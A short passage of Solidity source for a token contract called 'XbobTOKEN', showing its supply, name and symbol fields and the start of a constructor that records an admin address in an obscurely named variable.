...
contract XbobTOKEN is Ownable {
    address public gfvvcdt35;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "Xbob";
    string private _cctokensymbol = "Xbob";
    constructor(address tokenadmin) {
        gfvvcdt35 = tokenadmin;
